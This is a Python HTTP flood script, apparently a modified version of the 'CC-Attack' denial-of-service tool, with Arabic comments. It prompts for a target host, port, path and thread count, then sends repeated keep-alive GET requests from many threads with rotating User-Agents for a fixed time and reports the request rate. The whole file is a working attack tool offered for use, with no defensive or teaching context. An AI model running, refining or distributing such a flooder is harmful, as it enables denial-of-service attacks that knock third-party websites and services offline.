#!/usr/bin/python3
# Coded by Leeon123 - FIXED INPUT VERSION

import socket
import socks
import time
import random
import threading
import sys

print ('''
  ____ ____        _   _   _             _
 / ___/ ___|      / \ | |_| |_ __ _  ___| | __
| |  | |   _____ / _ \| __| __/ _` |/ __| |/ /
| |__| |__|_____/ ___ \ |_| || (_| | (__|   <
 \____\____|   /_/   \_\__|\__\__,_|\___|_|\_\\
Python3 version 1.1 - FIXED INPUT
                            Cobed by Leeon123
>---------------------------------------------<
             If you want to stop
            this script, pls just
              close the window.
>---------------------------------------------<''')

# قائمة User-Agents (مختصرة للتجربة)
useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

# طلب البيانات دفعة واحدة
print("\n" + "="*50)
print("ENTER ATTACK PARAMETERS")
print("="*50)

ip = str(input("> Host/IP (e.g., 127.0.0.1): "))
url = str(input("> Page to attack (e.g., /): "))
port = int(input("> Port (e.g., 80): "))
thread_num = int(input("> Threads (e.g., 10): "))
out_file = str(input("> Proxy file (e.g., proxy.txt): "))

# تحميل البروكسيات
try:
    with open(out_file, 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]
    print(f"> Loaded {len(proxies)} proxies")
except:
    print(f"> Error: Cannot read {out_file}")
    proxies = ["DIRECT"]

multiple = int(input("> Requests per connection (e.g., 3): "))

print(f"\n" + "="*50)
print("STARTING ATTACK...")
print("="*50)
print(f"Target: {ip}:{port}")
print(f"Path: {url}")
print(f"Threads: {thread_num}")
print(f"Proxies: {len(proxies)}")
print("="*50 + "\n")

# قائمة Accept Headers (مختصرة)
acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
]

attack_active = True
requests_sent = 0

def run():
    global requests_sent
    while attack_active:
        try:
            # اختيار بروكسي عشوائي
            proxy = random.choice(proxies)
            
            # بناء الطلب
            request = f"GET {url} HTTP/1.1\r\n"
            request += f"Host: {ip}\r\n"
            request += f"User-Agent: {random.choice(useragents)}\r\n"
            request += f"{random.choice(acceptall)}"
            request += "Connection: keep-alive\r\n\r\n"
            
            # الاتصال المباشر (بدون بروكسي للمباشرة)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((ip, port))
            
            # إرسال الطلبات
            for _ in range(multiple):
                s.send(request.encode())
                requests_sent += 1
            
            s.close()
            
            # طباعة تحديث كل 10 طلبات
            if requests_sent % 10 == 0:
                print(f"Requests sent: {requests_sent}")
            
            time.sleep(0.1)
            
        except ConnectionRefusedError:
            print("Connection refused - server may be down")
            time.sleep(1)
        except socket.timeout:
            print("Connection timeout")
            time.sleep(0.5)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(0.5)

# بدء الخيوط
threads = []
for i in range(thread_num):
    th = threading.Thread(target=run, daemon=True)
    th.start()
    threads.append(th)
    print(f"Started thread {i+1}")

# العد التنازلي
try:
    duration = 30  # 30 ثانية افتراضياً
    print(f"\nRunning for {duration} seconds...")
    
    for i in range(duration, 0, -1):
        print(f"\rTime remaining: {i}s | Total requests: {requests_sent}", end="")
        time.sleep(1)
    
    attack_active = False
    
except KeyboardInterrupt:
    print("\n\nStopped by user")
    attack_active = False

# الانتظار لثانية للتأكد من إيقاف الخيوط
time.sleep(1)

print(f"\n\n" + "="*50)
print("ATTACK COMPLETED")
print("="*50)
print(f"Total requests sent: {requests_sent}")
print(f"Duration: {duration} seconds")
print(f"Average RPS: {requests_sent/duration:.1f}")
print("="*50)